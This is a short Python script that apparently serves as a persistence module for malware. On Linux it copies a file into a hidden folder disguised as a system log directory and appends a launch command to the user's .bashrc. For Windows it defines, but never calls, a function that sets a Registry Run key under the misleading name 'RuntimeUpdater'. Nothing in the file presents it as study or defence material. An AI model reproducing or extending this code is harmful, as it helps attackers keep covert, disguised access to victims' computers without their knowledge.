import shutil
import platform
import os

# TODO: Make more custom and advanced

def run(name):
    user = os.getlogin()
    if platform.system() == "Linux":
        def move():
            fldrpath = f"/home/{user}/.local/share/.syslog/"
            filename = os.path.basename(name)
            print(filename)
            os.makedirs(fldrpath, exist_ok=True)
            shutil.copy(name, os.path.join(fldrpath, os.path.basename(name)))
            with open(f'/home/{user}/.bashrc', 'a') as fl:
                fl.write(f'python {fldrpath}{filename}')
        move()

    def create_run_key(script_path, python_path=None):
        if platform.system() != "Windows":
            return
        import winreg as reg

        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        program_name = "RuntimeUpdater"
        command = f"{name}"

        with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE) as key:
            reg.SetValueEx(key, program_name, 0, reg.REG_SZ, command)
 
